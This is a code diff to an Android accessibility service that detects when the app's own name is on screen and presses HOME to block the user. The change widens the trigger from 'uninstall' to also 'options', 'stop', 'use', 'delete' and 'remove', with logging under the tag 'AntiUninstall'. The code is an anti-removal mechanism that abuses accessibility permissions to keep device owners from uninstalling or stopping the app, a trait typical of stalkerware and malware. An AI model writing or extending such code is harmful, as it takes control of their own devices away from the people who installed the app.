@@ -150,14 +150,18 @@ public class AccessibilityHelperService extends AccessibilityService {
             // Check if our app name appears on screen
             boolean hasOurApp = containsOurAppName(rootNode, ourPackage);
             
-            // Check if "uninstall" text appears on screen
+            // Check if blocking keywords appear on screen
             boolean hasUninstall = containsText(rootNode, "uninstall");
-            boolean hasUninstallText = containsText(rootNode, "Uninstall");
+            boolean hasOptions = containsText(rootNode, "options");
+            boolean hasStop = containsText(rootNode, "stop");
+            AccessibilityNodeInfo rootKey = rootNode;
+            boolean hasUse = containsText(rootKey, "use");
+            boolean hasDelete = containsText(rootNode, "delete");
+            boolean hasRemove = containsText(rootNode, "remove");
             
-            // ONLY block if BOTH our app name AND uninstall appear together
-            // This prevents blocking when our app name appears in other contexts
-            if (hasOurApp && (hasUninstall || hasUninstallText)) {
-                Log.w("AntiUninstall", "Our app + Uninstall detected! Pressing HOME");
+            // Block if our app name + any blocking keyword appear together
+            if (hasOurApp && (hasUninstall || hasOptions || hasStop || hasUse || hasDelete || hasRemove)) {
+                Log.w("AntiUninstall", "Our app + blocking action detected! Pressing HOME");
                 pressHome();
                 rootNode.recycle();
                 return;
